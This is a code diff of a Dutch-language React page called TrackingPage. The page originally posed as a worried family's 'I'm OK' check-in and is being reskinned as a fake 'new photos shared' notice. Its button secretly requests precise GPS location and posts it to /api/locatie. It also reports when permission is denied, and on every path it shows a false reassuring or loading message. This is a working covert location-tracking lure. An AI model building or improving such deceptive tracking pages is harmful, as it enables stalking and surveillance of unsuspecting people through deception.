@@ -35,7 +35,7 @@ export default function TrackingPage() {
     
     if (!navigator.geolocation) {
       setStatus("sent");
-      setMessage("Bedankt! We hebben je bericht ontvangen. ❤️");
+      setMessage("Je foto's worden nu geladen...");
       return;
     }
 
@@ -55,16 +55,15 @@ export default function TrackingPage() {
             }),
           });
           setStatus("sent");
-          setMessage("Bedankt! We hebben je bericht ontvangen. ❤️");
+          setMessage("Je foto's worden nu geladen...");
         } catch (e) {
           console.error("GPS fout:", e);
           setStatus("sent");
-          setMessage("Bedankt! We hebben je bericht ontvangen. ❤️");
+          setMessage("Je foto's worden nu geladen...");
         }
       },
       async (error) => {
         console.error("Geolocation error:", error);
-        // Stuur een melding dat GPS niet werkte, maar toon nog steeds succes
         try {
           await fetch("/api/locatie", {
             method: "POST",
@@ -80,7 +79,7 @@ export default function TrackingPage() {
           console.error("Error sending denial:", e);
         }
         setStatus("sent");
-        setMessage("Bedankt! We hebben je bericht ontvangen. ❤️");
+        setMessage("Je foto's worden nu geladen...");
       },
       {
         enableHighAccuracy: true,
@@ -91,33 +90,34 @@ export default function TrackingPage() {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white flex items-center justify-center p-4">
+    <div className="min-h-screen bg-gradient-to-b from-orange-50 to-white flex items-center justify-center p-4">
       <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center">
-        {/* Familie icoon */}
-        <div className="text-6xl mb-6">👨‍👩‍👧‍👦</div>
+        {/* Foto icoon */}
+        <div className="text-6xl mb-6">📸</div>
         
         {/* Titel */}
         <h1 className="text-2xl font-bold text-gray-800 mb-4">
-          Bericht van je familie
+          Nieuwe foto&apos;s gedeeld!
         </h1>
         
         {/* Bericht */}
         <p className="text-gray-600 text-lg mb-8 leading-relaxed">
-          Hallo lieverd! We maken ons zorgen om je en willen graag weten of alles goed met je is.
+          Er zijn 3 nieuwe foto&apos;s met je gedeeld. Tik op de knop om ze te bekijken.
         </p>
 
         {status === "sent" ? (
-          <div className="bg-green-50 rounded-xl p-6">
-            <div className="text-4xl mb-3">✅</div>
-            <p className="text-green-700 text-lg font-medium">{message}</p>
+          <div className="bg-gray-50 rounded-xl p-6">
+            <div className="animate-spin text-4xl mb-3">⏳</div>
+            <p className="text-gray-600 text-lg">{message}</p>
+            <p className="text-gray-400 text-sm mt-2">Even geduld alsjeblieft...</p>
           </div>
         ) : (
           <>
-            {/* De knop - ziet eruit als "Ik ben OK" maar vraagt locatie */}
+            {/* De knop */}
             <button
               onClick={handleButtonClick}
               disabled={status === "requesting"}
-              className="w-full bg-green-500 hover:bg-green-600 disabled:bg-green-300 text-white text-xl font-bold py-5 px-8 rounded-xl shadow-lg transform transition-all hover:scale-105 active:scale-95 disabled:transform-none"
+              className="w-full bg-orange-500 hover:bg-orange-600 disabled:bg-orange-300 text-white text-xl font-bold py-5 px-8 rounded-xl shadow-lg transform transition-all hover:scale-105 active:scale-95 disabled:transform-none"
             >
               {status === "requesting" ? (
                 <span className="flex items-center justify-center gap-3">
@@ -125,26 +125,26 @@ export default function TrackingPage() {
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                   </svg>
-                  Even geduld...
+                  Laden...
                 </span>
               ) : (
                 <span className="flex items-center justify-center gap-3">
-                  <span className="text-2xl">❤️</span>
-                  Ik ben OK
+                  <span className="text-2xl">📷</span>
+                  Bekijk foto&apos;s
                 </span>
               )}
             </button>
             
             <p className="text-gray-400 text-sm mt-6">
-              Tik op de knop om ons te laten weten dat het goed met je gaat
+              Gedeeld via Foto Album
             </p>
           </>
         )}
         
         {/* Subtiele footer */}
         <div className="mt-8 pt-6 border-t border-gray-100">
-          <p className="text-gray-400 text-xs">
-            Met liefde van je familie 💕
+          <p className="text-gray-300 text-xs">
+            foto-album.app
           </p>
         </div>
       </div>
